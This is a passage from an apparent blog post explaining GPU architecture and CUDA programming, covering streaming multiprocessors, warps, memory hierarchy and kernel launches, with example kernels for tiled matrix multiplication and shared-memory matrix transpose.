/></p><p>Modern GPUs achieve high performance by prioritizing<strong>throughput-oriented parallelism</strong> rather thansingle-thread latency. Instead of a few complex cores like CPUs, a GPUconsists of many <strong>Streaming Multiprocessors (SMs)</strong>, eachof which contains a large number of simple compute cores designed toexecute the same operations in parallel.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125222912708.png" alt="image-20260125222912708" style="zoom:70%;" /></p><p>An SM is the fundamental execution unit of a GPU. Each SM is dividedinto <strong>four partitions</strong>, and each partition contains<strong>32 CUDA cores</strong>, matching the size of a<strong>warp</strong>, which is the basic scheduling and execution unitin NVIDIA GPUs. A warp consists of <strong>32 threads that execute thesame instruction in lockstep</strong> (SIMT: Single Instruction,Multiple Threads). As a result, a single SM contains <strong>128cores</strong> and can execute up to <strong>128 FP32 operations percycle</strong> under ideal conditions.</p><p>Within each partition, a <strong>warp scheduler</strong> selects aready warp every cycle, while the <strong>dispatch unit</strong> issuesits instruction to the appropriate execution units (e.g., FP32 cores,Tensor Cores, or load/store units). GPUs do not schedule individualthreads; instead, they schedule warps. When one warp stalls due tomemory access, the scheduler can immediately switch to another readywarp with negligible overhead, allowing GPUs to effectively <strong>hidememory latency</strong> through massive concurrency.</p><p>Each SM also contains a large <strong>register file</strong> (thefastest on-chip storage) and a shared <strong>L1 cache / sharedmemory</strong>, which enable fast data reuse and communication betweenthreads within a block. Newer architectures such as NVIDIA H100significantly increase the L1/shared memory capacity and enhance TensorCores, further optimizing the SM for large-scale matrix and tensorcomputations commonly found in deep learning workloads.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125223615074.png" alt="image-20260125223615074" style="zoom:50%;" /></p><p>H100 introduces FP8 to further improve throughput and reduce memorybandwidth requirements for large-scale AI workloads. By<strong><u>supporting multiple FP8 formats and accumulating results inhigher precision</u></strong>, the architecture achieves both highperformance and numerical stability.</p><blockquote><p>Transformer Engine is a hardware–software co-designed system in H100that automatically manages precision, scaling, and accumulation tosafely use FP8 for Transformer workloads.</p></blockquote><p><strong>CPU vs. GPU</strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125223107120.png" alt="image-20260125223107120" style="zoom: 33%;" /></p><h2 id="program-execution-on-gpu">Program Execution on GPU</h2><p>In the CUDA programming model, the <strong><u>CPU acts as the hostthat controls execution and launches GPU kernels</u></strong>, while the<strong><u>GPU serves as a device optimized for massively parallelcomputation</u></strong>. Kernels are executed using a SIMT model, wherethreads are organized into blocks and grids and mapped onto multiple SMsfor parallel execution.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125224122973.png" alt="image-20260125224122973" style="zoom: 33%;" /></p><h3 id="how-kernel-threads-are-executed">How Kernel Threads areExecuted</h3><p>When a CUDA kernel is launched, threads are first organized into<strong>thread blocks</strong>, which are then assigned to<strong>Streaming Multiprocessors (SMs)</strong>. Within an SM, eachthread block is further <strong>partitioned into warps</strong>, and<u><strong>warp</strong> is the fundamental unit used by the GPU tocreate, manage, schedule, and execute threads.</u></p><p>A <strong>warp</strong> consists of <strong>32 threads</strong>. Allthreads in a warp start execution at the same program address, but<u>each thread maintains its own <strong>program counter and registerstate</strong></u>. At any given cycle, a warp executes <strong>onecommon instruction across all 32 threads</strong>, following the SIMT(Single Instruction, Multiple Threads) execution model. Although threadswithin a warp can take different control-flow paths due to branching,divergent paths are serialized by the hardware, which can reduceperformance.</p><h3 id="warp-execution-model-on-an-sm">Warp Execution Model on anSM</h3><p>Once a warp is assigned to an SM, <u>its <strong>execution contextremains resident on the SM for the entire lifetime of thewarp</strong></u>. This context includes the program counter, registervalues, and any shared memory used by the warp. Because all active warpskeep their contexts on-chip, <strong><u>switching between warps does notrequire saving or restoring state</u></strong>, making warp-to-warpcontext switching effectively instantaneous.</p><p>At runtime, each SM contains one or more <strong>warpschedulers</strong>, which continuously select a warp with active andready threads. The selected warp’s next instruction is then<strong>issued (dispatched)</strong> to the appropriate execution units,such as FP32 cores, Tensor Cores, or load/store units. If a warp stallsdue to a long-latency operation (e.g., global memory access), thescheduler can immediately switch to another ready warp, allowing the SMto hide memory latency through concurrency.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125224641812.png" alt="image-20260125224641812" style="zoom:40%;" /></p><blockquote><p>Although NVIDIA GPUs expose a SIMT programming model, warp executionis implemented using SIMD-style vector execution with predication andmasking at the hardware level.</p></blockquote><h3 id="cpu-gpu-data-movement">CPU-GPU Data Movement</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125224832439.png" alt="image-20260125224832439" style="zoom:33%;" /></p><h3 id="cuda-kernel">CUDA Kernel</h3><p>A CUDA <strong>kernel</strong> is a function that runs on the GPU.From a programming perspective, a kernel describes the execution logicfor <strong>a single thread</strong>, and the code itself is written ina <strong>serial manner</strong>. Parallelism does not come from thecode structure, but from the fact that the kernel is executedsimultaneously by a large number of threads.</p><p>When a kernel is launched, <strong>thousands of threads</strong> mayexecute the same kernel function concurrently. Each thread uses its<strong>thread index</strong> (e.g., <code>threadIdx</code>,<code>blockIdx</code>) to determine which portion of the data itoperates on. This follows the SPMD (Single Program, Multiple Data)model: the same program is replicated across many threads, each workingon different data elements.</p><p>Key characteristics of CUDA kernels:</p><ul><li>The kernel code is <strong>serial per thread</strong></li><li>Massive parallelism is achieved by <strong>many threads executingthe same kernel</strong></li><li>Thread indices are used to map threads to data</li><li>The programmer expresses <em>what one thread does</em>, not howthreads are scheduled</li></ul><h3 id="compiling-cuda-code">Compiling CUDA Code</h3><p>CUDA programs follow a <strong>heterogeneous programmingmodel</strong>, where <u>a single source file contains both <strong>host(CPU)</strong> code and <strong>device (GPU)</strong> code.</u> The CUDAcompiler, <strong>NVCC</strong>, acts as a compiler driver thatseparates these two parts and compiles them differently.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125225428030.png" alt="image-20260125225428030" style="zoom:50%;" /></p><p>During compilation:</p><ul><li><strong>Host code</strong> is passed to a standard C/C++ compiler(e.g., <code>gcc</code> or <code>clang</code>) and compiled intoCPU-executable code.</li><li><strong>Device code</strong> (CUDA kernels) is compiled into<strong>PTX</strong>, an intermediate representation for NVIDIAGPUs.</li></ul><p>At runtime, the PTX code is <strong>just-in-time (JIT)compiled</strong> by the NVIDIA driver into machine code specific to thetarget GPU architecture. This design allows the same CUDA binary to runon different GPU generations without recompiling the source code.</p><blockquote><p>PTX serves as an intermediate representation rather than finalmachine code. At runtime, the NVIDIA driver JIT-compiles PTX intoarchitecture-specific GPU instructions, enabling the same CUDA binary torun across different GPU generations.</p></blockquote><h2 id="basic-gpu-cuda-operations">Basic GPU CUDA operations</h2><p>In CUDA, all GPU operations are orchestrated by the CPU. The hostexplicitly allocates device memory using <code>cudaMalloc</code>,transfers data between host and device with <code>cudaMemcpy</code>,launches GPU kernels, and finally releases device memory with<code>cudaFree</code>. This explicit memory management model reflectsCUDA’s heterogeneous design, where the GPU acts as a compute acceleratorcontrolled by the CPU.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125230332427.png" alt="image-20260125230332427" style="zoom:33%;" /></p><h3 id="gpu-memory">GPU Memory</h3><p>CUDA provides a hierarchical memory model. Each thread has<strong>private registers</strong>, which are the fastest memory toaccess.</p><p>Threads within the same <strong>thread block</strong> can communicatethrough <strong><u>shared memory</u></strong>, which is explicitlydeclared with <code>__shared__</code> and has much lower latency thanglobal memory.</p><p>In contrast, <strong><u>global memory</u></strong> is accessible byall threads across all blocks and persists across kernel launches, butit has the highest access latency.</p><h3 id="data-movement">Data Movement</h3><p>Data movement between the CPU and GPU is explicitly managed by theprogrammer using <code>cudaMemcpy</code>. Memory can be copied<strong>from host to device</strong> or <strong>from device tohost</strong>, with the transfer size specified in bytes. Since CPU–GPUdata transfers are relatively expensive, performance-criticalapplications aim to minimize such transfers and maximize data reuse onthe GPU.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125230847834.png" alt="image-20260125230847834" style="zoom: 40%;" /></p><p>On each Streaming Multiprocessor (SM), instructions are issued toexecution units through a limited number of <strong>issue slots</strong>per cycle. An issue slot represents the hardware capacity to dispatch aninstruction from a warp in a given cycle, and thus directly limitsinstruction throughput on the SM.</p><p>In pre-Hopper architectures (e.g., A100), warps waiting for memoryoperations—such as <strong><u>asynchronous copies into sharedmemory</u></strong>—still participate in scheduling. Even when a warp isstalled on a barrier, it repeatedly checks readiness, occupying issueslots and reducing overall SM utilization.</p><p>Hopper introduces a key change in this execution model. With the<strong><u>Tensor Memory Accelerator (TMA)</u></strong>, memorytransfers are offloaded to a dedicated hardware unit, and warps waitingon copy completion are put into a <strong>sleep state</strong>.<strong><u>Sleeping warps are removed from the scheduler’s active setand no longer consume issue slots</u></strong>. As a result, issue slotsare exclusively used by warps that are ready to execute computation,enabling higher instruction throughput and more effective overlapbetween memory movement and compute.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125232105257.png" alt="image-20260125232105257" style="zoom: 40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125232132936.png" alt="image-20260125232132936" style="zoom:50%;" /></p><h3 id="declaration-of-hostdevice-function">Declaration of Host/Devicefunction</h3><table><thead><tr class="header"><th>Keyword</th><th>Call on</th><th>Execute On</th><th>Used</th></tr></thead><tbody><tr class="odd"><td><code>__global__</code></td><td>host（CPU）</td><td>device（GPU）</td><td><strong>GPU kernel</strong></td></tr><tr class="even"><td><code>__device__</code></td><td>device</td><td>device</td><td>GPU Func</td></tr><tr class="odd"><td><code>__host__</code></td><td>host</td><td>host</td><td>Normal CPU Func</td></tr></tbody></table><p>CUDA distinguishes host and device functions using explicitqualifiers. A <code>__global__</code> function defines a GPU kernel,which is launched from the CPU but executed in parallel by many threadson the GPU. Each thread runs the same kernel code and uses its threadand block indices to determine which portion of the data itprocesses.</p><h3 id="calling-kernel-at-runtime">Calling Kernel at Runtime</h3><p>In CUDA, a kernel’s parallel execution configuration is<strong>specified at runtime by the host (CPU)</strong> rather thanbeing fixed at compile time. When launching a kernel, the hostexplicitly defines the <strong>grid–block–thread hierarchy</strong>,which determines how many GPU threads will execute the kernel.</p><p>A kernel is launched using the special syntax:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernelFunc&lt;&lt;&lt;Dg, Db&gt;&gt;&gt;(args);</span><br></pre></td></tr></table></figure><p>Here, <code>Dg</code> (grid dimension) and <code>Db</code> (blockdimension) can be specified either as integers or as <code>dim3</code>objects:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">dim3 <span class="title">Dg</span><span class="params">(<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function">dim3 <span class="title">Db</span><span class="params">(<span class="number">8</span>, <span class="number">8</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">kernelFunc&lt;&lt;&lt;Dg, Db&gt;&gt;&gt;(args);</span><br></pre></td></tr></table></figure><ul><li><code>Dg</code> defines the <strong>size of the grid</strong>, i.e.,the number of thread blocks.</li><li><code>Db</code> defines the <strong>size of each block</strong>,i.e., the number of threads per block.</li></ul><p>The total number of blocks is <code>Dg.x * Dg.y * Dg.z</code>, andthe total number of threads per block is<code>Db.x * Db.y * Db.z</code>, which must not exceed 1024 on currentNVIDIA GPUs.</p><h3 id="device-runtime-variables">Device Runtime Variables</h3><p>Once a kernel is launched, each thread executing on the GPU must beable to identify <strong>which block it belongs to and which thread itis within that block</strong>. CUDA provides a set of built-indevice-side variables for this purpose, which are automaticallygenerated by the compiler.</p><p>These variables include:</p><ul><li><code>gridDim</code> (<code>dim3</code>): dimensions of thegrid</li><li><code>blockIdx</code> (<code>uint3</code>): index of the currentblock within the grid</li><li><code>blockDim</code> (<code>dim3</code>): dimensions of ablock</li><li><code>threadIdx</code> (<code>uint3</code>): index of the currentthread within the block</li></ul><p>All kernel threads execute the same code, but by using thesevariables, each thread can compute a unique global index. A commonpattern is:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int i = blockIdx.x * blockDim.x + threadIdx.x;</span><br></pre></td></tr></table></figure><p>This allows threads to map naturally to elements of arrays or otherdata structures stored in global memory.</p><h3 id="calling-a-cuda-kernel-from-the-cpu">Calling a CUDA Kernel fromthe CPU</h3><p>In practice, the host typically computes the grid and block sizesbased on the input problem size. For example, when processing a vectorof length <code>n</code>, a common approach is to choose a fixed numberof threads per block and compute the number of required blocks usinginteger division with rounding up:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">1024</span>;</span><br><span class="line"><span class="type">int</span> threads_per_block = <span class="number">256</span>;</span><br><span class="line"><span class="type">int</span> num_blocks = (n + threads_per_block - <span class="number">1</span>) / threads_per_block;</span><br><span class="line"></span><br><span class="line">VecAddKernel&lt;&lt;&lt;num_blocks, threads_per_block&gt;&gt;&gt;(dA, dB, dC, n);</span><br></pre></td></tr></table></figure><p>When this launch occurs:</p><ol type="1"><li>The CPU issues the kernel launch with the specified grid and blockconfiguration.</li><li>The GPU creates the grid of blocks and schedules them onto availableStreaming Multiprocessors (SMs).</li><li>Each block is further divided into warps, and threads execute thekernel code in parallel.</li><li>Each thread determines which data element it operates on using<code>blockIdx</code>, <code>blockDim</code>, and<code>threadIdx</code>.</li></ol><h1 id="gpu-acceleration">GPU Acceleration</h1><h2 id="memory-access-efficiency">Memory Access Efficiency</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126001922475.png" alt="image-20260126001922475" style="zoom:50%;" /></p><h2 id="cuda-device-memory-model">CUDA Device Memory Model</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126002047948.png" alt="image-20260126002047948" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126003051375.png" alt="image-20260126003051375" style="zoom: 33%;" /></p><h2 id="tiling-for-matrix-multiplication">Tiling for MatrixMultiplication</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131507652.png" alt="image-20260126131507652" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131528542.png" alt="image-20260126131528542" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131541664.png" alt="image-20260126131541664" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131553021.png" alt="image-20260126131553021" style="zoom:50%;" /></p><p>A implement in cuda cpp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatrixMultiplyKernel</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> *out,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *out_shape,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *out_strides,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> *a_storage,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *a_shape,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *a_strides,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> *b_storage,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *b_shape,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *b_strides)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Multiply two (compact) matrices into an output (also comapct) matrix. Matrix a and b are both in a batch</span></span><br><span class="line"><span class="comment">   * format, with shape [batch_size, m, n], [batch_size, n, p].</span></span><br><span class="line"><span class="comment">   * Requirements:</span></span><br><span class="line"><span class="comment">   * - All data must be first moved to shared memory.</span></span><br><span class="line"><span class="comment">   * - Only read each cell in a and b once.</span></span><br><span class="line"><span class="comment">   * - Only write to global memory once per kernel.</span></span><br><span class="line"><span class="comment">   * There is guarantee that a_shape[0] == b_shape[0], a_shape[2] == b_shape[1],</span></span><br><span class="line"><span class="comment">   * and out_shape[0] == a_shape[0], out_shape[1] == a_shape[1], out_shape[2] == b_shape[2].</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * Args:</span></span><br><span class="line"><span class="comment">   *   out: compact 1D array of size batch_size x m x p to write the output to</span></span><br><span class="line"><span class="comment">   *   out_shape: shape of the output array</span></span><br><span class="line"><span class="comment">   *   out_strides: strides of the output array</span></span><br><span class="line"><span class="comment">   *   a_storage: compact 1D array of size batch_size x m x n</span></span><br><span class="line"><span class="comment">   *   a_shape: shape of the a array</span></span><br><span class="line"><span class="comment">   *   a_strides: strides of the a array</span></span><br><span class="line"><span class="comment">   *   b_storage: comapct 2D array of size batch_size x n x p</span></span><br><span class="line"><span class="comment">   *   b_shape: shape of the b array</span></span><br><span class="line"><span class="comment">   *   b_strides: strides of the b array</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * Returns:</span></span><br><span class="line"><span class="comment">   *   None (Fills in out array)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  __shared__ <span class="type">float</span> a_shared[TILE][TILE];</span><br><span class="line">  __shared__ <span class="type">float</span> b_shared[TILE][TILE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// In each block, we will compute a batch of the output matrix</span></span><br><span class="line">  <span class="comment">// All the threads in the block will work together to compute this batch</span></span><br><span class="line">  <span class="type">int</span> batch = blockIdx.z;</span><br><span class="line">  <span class="type">int</span> a_batch_stride = a_shape[<span class="number">0</span>] &gt; <span class="number">1</span> ? a_strides[<span class="number">0</span>] : <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> b_batch_stride = b_shape[<span class="number">0</span>] &gt; <span class="number">1</span> ? b_strides[<span class="number">0</span>] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// BEGIN HW1_4</span></span><br><span class="line">  <span class="comment">/// TODO</span></span><br><span class="line">  <span class="comment">// Hints:</span></span><br><span class="line">  <span class="comment">// 1. Compute the row and column of the output matrix this block will compute</span></span><br><span class="line">  <span class="type">int</span> row = blockIdx.y * TILE + threadIdx.y;</span><br><span class="line">  <span class="type">int</span> col = blockIdx.x * TILE + threadIdx.x;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get matrix dimensions: A[batch, m, n] × B[batch, n, p] = C[batch, m, p]</span></span><br><span class="line">  <span class="type">int</span> m = a_shape[<span class="number">1</span>];</span><br><span class="line">  <span class="type">int</span> n = a_shape[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> p = b_shape[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. Compute the position in the output array that this thread will write to</span></span><br><span class="line">  <span class="comment">// (moved to step 7 for bounds checking)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Accumulator for dot product</span></span><br><span class="line">  <span class="type">float</span> sum = <span class="number">0.0f</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. Iterate over tiles of the two input matrices, read the data into shared memory</span></span><br><span class="line">  <span class="type">int</span> num_tiles = (n + TILE - <span class="number">1</span>) / TILE;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; num_tiles; t++) &#123;</span><br><span class="line">    <span class="comment">// Load A tile: A[row, t*TILE + threadIdx.x]</span></span><br><span class="line">    <span class="type">int</span> a_col = t * TILE + threadIdx.x;</span><br><span class="line">    <span class="keyword">if</span> (row &lt; m &amp;&amp; a_col &lt; n) &#123;</span><br><span class="line">      a_shared[threadIdx.y][threadIdx.x] = a_storage[batch * a_batch_stride + row * a_strides[<span class="number">1</span>] + a_col * a_strides[<span class="number">2</span>]];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a_shared[threadIdx.y][threadIdx.x] = <span class="number">0.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load B tile: B[t*TILE + threadIdx.y, col]</span></span><br><span class="line">    <span class="type">int</span> b_row = t * TILE + threadIdx.y;</span><br><span class="line">    <span class="keyword">if</span> (b_row &lt; n &amp;&amp; col &lt; p) &#123;</span><br><span class="line">      b_shared[threadIdx.y][threadIdx.x] = b_storage[batch * b_batch_stride + b_row * b_strides[<span class="number">1</span>] + col * b_strides[<span class="number">2</span>]];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      b_shared[threadIdx.y][threadIdx.x] = <span class="number">0.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. Synchronize to make sure the data is available to all threads</span></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. Compute the output tile for this thread block</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; TILE; k++) &#123;</span><br><span class="line">      sum += a_shared[threadIdx.y][k] * b_shared[k][threadIdx.x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. Synchronize to make sure all threads are done computing the output tile for (row, col)</span></span><br><span class="line">    __syncthreads();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 7. Write the output to global memory</span></span><br><span class="line">  <span class="keyword">if</span> (row &lt; m &amp;&amp; col &lt; p) &#123;</span><br><span class="line">    <span class="type">int</span> out_pos = batch * out_strides[<span class="number">0</span>] + row * out_strides[<span class="number">1</span>] + col * out_strides[<span class="number">2</span>];</span><br><span class="line">    out[out_pos] = sum;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/// END HW1_4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2id="matrix-transpose-on-gpu-coalescing-shared-memory-and-bank-conflicts">MatrixTranspose on GPU: Coalescing, Shared Memory, and Bank Conflicts</h2><h3 id="a-coalesced-transpose-kernel">A Coalesced Transpose Kernel</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">smem_cuda_transpose</span><span class="params">(<span class="type">int</span> m, <span class="type">float</span>* a, <span class="type">float</span>* c)</span> </span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> smem[BLOCK_X][BLOCK_Y];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tileCol = blockDim.x * blockIdx.x;</span><br><span class="line">    <span class="type">int</span> tileRow = blockDim.y * blockIdx.y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load from global memory → shared memory</span></span><br><span class="line">    smem[threadIdx.x][threadIdx.y] =</span><br><span class="line">        a[(tileRow + threadIdx.y) * m + (tileCol + threadIdx.x)];</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Store from shared memory → global memory</span></span><br><span class="line">    c[(tileCol + threadIdx.y) * m + (tileRow + threadIdx.x)] =</span><br><span class="line">        smem[threadIdx.y][threadIdx.x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>What this fixes</p><p>✅ Global memory reads are coalesced ✅ Global memory writes arecoalesced</p><p>But…</p><p>❌ <strong>Shared memory bank conflicts appear</strong></p><h3 id="shared-memory-banks-the-real-bottleneck">Shared Memory Banks:The Real Bottleneck</h3><ul><li>Shared memory is divided into <strong>32 banks</strong></li><li>Each bank serves <strong>one 32-bit word per cycle</strong></li><li>A warp can access shared memory in <strong>1 cycle</strong> <em>onlyif</em>:<ul><li>Each thread accesses a <strong>different bank</strong></li></ul></li></ul><p><code>smem[threadIdx.x][threadIdx.y]</code> this code actually causethe bank conflict.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126142048710.png" alt="image-20260126142048710" style="zoom: 40%;" /></p><h3 id="the-fix-padding-shared-memory">The Fix: Padding SharedMemory</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">smem_cuda_transpose</span><span class="params">(<span class="type">int</span> m, <span class="type">float</span>* a, <span class="type">float</span>* c)</span> </span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> smem[BLOCK_X][BLOCK_Y + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tileCol = blockDim.x * blockIdx.x;</span><br><span class="line">    <span class="type">int</span> tileRow = blockDim.y * blockIdx.y;</span><br><span class="line"></span><br><span class="line">    smem[threadIdx.x][threadIdx.y] =</span><br><span class="line">        a[(tileRow + threadIdx.y) * m + (tileCol + threadIdx.x)];</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    c[(tileCol + threadIdx.y) * m + (tileRow + threadIdx.x)] =</span><br><span class="line">        smem[threadIdx.y][threadIdx.x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126142323660.png" alt="image-20260126142323660" style="zoom:40%;" /></p><h2 id="sparse-matrix-multiplication">Sparse Matrix Multiplication</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126150918193.png" alt="image-20260126150918193" style="zoom:80%;" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span 